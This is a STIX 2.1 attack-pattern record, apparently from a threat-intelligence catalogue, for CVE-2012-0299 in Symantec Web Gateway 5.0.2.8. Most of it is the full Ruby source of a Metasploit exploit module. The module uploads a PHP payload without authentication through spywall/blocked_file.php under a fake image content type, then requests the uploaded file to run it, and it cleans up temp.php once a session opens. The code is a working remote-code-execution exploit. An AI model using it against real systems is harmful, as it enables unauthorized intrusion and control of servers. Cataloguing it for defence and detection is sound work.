{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8b3318ca-adb4-4599-ad59-288c0fa9af66",
    "created": "2024-08-14T17:01:41.131714Z",
    "modified": "2024-08-14T17:01:41.131718Z",
    "name": "\"Symantec Web Gateway 5.0.2.8 Arbitrary PHP File Upload Vulnerability\"",
    "description": " This module exploits a file upload vulnerability found in Symantec Web Gateway's HTTP service. Due to the incorrect use of file extensions in the upload_file() function, attackers may to abuse the spywall/blocked_file.php file in order to upload a malicious PHP file without any authentication, which results in arbitrary code execution.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/symantec_web_gateway_file_upload.rb",
            "external_id": "symantec_web_gateway_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0299"
        },
        {
            "source_name": "reference",
            "url": "http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120517_00"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"Symantec Web Gateway 5.0.2.8 Arbitrary PHP File Upload Vulnerability\",\n        'Description' => %q{\n          This module exploits a file upload vulnerability found in Symantec Web Gateway's\n          HTTP service. Due to the incorrect use of file extensions in the upload_file()\n          function, attackers may to abuse the spywall/blocked_file.php file in order to\n          upload a malicious PHP file without any authentication, which results in arbitrary\n          code execution.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Unknown', # Tenable Network Security, Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2012-0299' ],\n          [ 'OSVDB', '82025' ],\n          [ 'BID', '53443' ],\n          [ 'ZDI', '12-091' ],\n          [ 'URL', 'http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120517_00' ]\n        ],\n        'Payload' => {\n          'BadChars' => \"\\x00\"\n        },\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        },\n        'Platform' => ['php'],\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          ['Symantec Web Gateway 5.0.2.8', {}],\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2012-05-17',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        }\n      )\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri' => '/spywall/login.php'\n    })\n\n    if res and res.body =~ /\\<title\\>Symantec Web Gateway\\<\\/title\\>/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def on_new_session(client)\n    print_warning(\"Deleting temp.php\")\n    if client.type == \"meterpreter\"\n      client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n      client.fs.file.rm(\"temp.php\")\n    else\n      client.shell_command_token(\"rm temp.php\")\n    end\n  end\n\n  def exploit\n    uri = target_uri.path\n    uri << '/' if uri[-1, 1] != '/'\n\n    peer = \"#{rhost}:#{rport}\"\n    payload_name = Rex::Text.rand_text_alpha(rand(10) + 5) + '.php'\n    before_filename = rand_text_alpha(rand(10) + 5)\n    after_filename = rand_text_alpha(rand(10) + 5)\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(\"true\", nil, nil, \"form-data; name=\\\"submitted\\\"\")\n    post_data.add_part(before_filename, \"application/octet-stream\", nil, \"form-data; name=\\\"before_filename\\\"\")\n    post_data.add_part(after_filename, \"application/octet-stream\", nil, \"form-data; name=\\\"after_filename\\\"\")\n    post_data.add_part(\"<?php #{payload.encoded} ?>\", \"image/gif\", nil, \"form-data; name=\\\"new_image\\\"; filename=\\\"#{payload_name}\\\"\")\n\n    print_status(\"Sending PHP payload (#{payload_name})\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri, \"spywall/blocked_file.php\"),\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'data' => post_data.to_s\n    })\n\n    # If the server returns 200 and the body contains the name\n    # of the default file, we assume we uploaded the malicious\n    # file successfully\n    if not res or res.code != 200 or res.body !~ /temp.php/\n      print_error(\"File wasn't uploaded, aborting!\")\n      return\n    end\n\n    print_status(\"Executing PHP payload (#{payload_name})\")\n    # Execute our payload\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => \"#{uri}spywall/images/upload/temp/temp.php\"\n    })\n\n    # If we don't get a 200 when we request our malicious payload, we suspect\n    # we don't have a shell, either.  Print the status code for debugging purposes.\n    if res and res.code != 200\n      print_status(\"Server returned #{res.code.to_s}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-05-17",
    "x_mitre_platforms": [
        "['php']"
    ]
}